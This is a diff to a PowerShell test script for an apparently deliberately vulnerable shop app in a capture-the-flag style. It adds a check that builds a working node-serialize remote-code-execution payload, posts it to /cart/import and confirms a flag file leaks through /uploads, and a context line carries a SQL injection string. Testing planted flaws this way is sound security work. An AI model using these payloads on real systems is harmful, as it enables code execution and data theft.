@@ -266,6 +266,30 @@ $r = Hit -Path "/admin/users?q=%25%27%20OR%20%271%27%3D%271" -Session $realSessi
 Check 'SQLi /admin/users 200' ((StatusOf $r) -eq 200)
 
 Write-Host ''
+Write-Host '--- 13 Insecure deserialization on /cart/import (V-SHOP-100) ---' -ForegroundColor Cyan
+# Build the node-serialize IIFE payload and base64 it.
+$iife = "_" + '$' + '$' + 'ND_FUNC' + '$' + '$' + "_" + `
+        "function(){var fs=require('fs');" + `
+        "fs.writeFileSync('data/uploads/leak.txt'," + `
+        "fs.readFileSync('data/.deserialize-flag','utf8'));}()"
+# node-serialize.serialize emits JSON with the magic string verbatim.
+$tokenJson = '{"items":[],"owner_id":1,"rce":"' + ($iife -replace '\\', '\\\\' -replace '"','\"') + '"}'
+$tokenB64  = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($tokenJson))
+# Remove any stale leak file from a previous run.
+$leakPath = Join-Path $PSScriptRoot 'data\uploads\leak.txt'
+if (Test-Path $leakPath) { Remove-Item $leakPath -Force }
+# A throwaway session is fine.
+$dsName = 'ds_' + (Get-Random)
+Hit -Method POST -Path '/register' -Form @{ username = $dsName; password = 'x'; email="$dsName@x"; full_name=$dsName } | Out-Null
+$dsSession = Login $dsName 'x'
+$r = Hit -Method POST -Path '/cart/import' -Session $dsSession -Form @{ token = $tokenB64 }
+Check '/cart/import accepts attacker token (200/302)' ((StatusOf $r) -in 200,302)
+Start-Sleep -Milliseconds 200
+$r = Hit -Path '/uploads/leak.txt'
+$body = ReadBody $r
+Check 'Flag exfiltrated via /uploads/leak.txt' ($body -match 'AccessibleBBB\{deserialize-node-serialize-rce\}')
+
+Write-Host ''
 Write-Host '======================================================'
 $color = if ($script:fail -eq 0) { 'Green' } else { 'Yellow' }
 Write-Host (' RESULT: {0} passed / {1} failed' -f $script:pass, $script:fail) -ForegroundColor $color
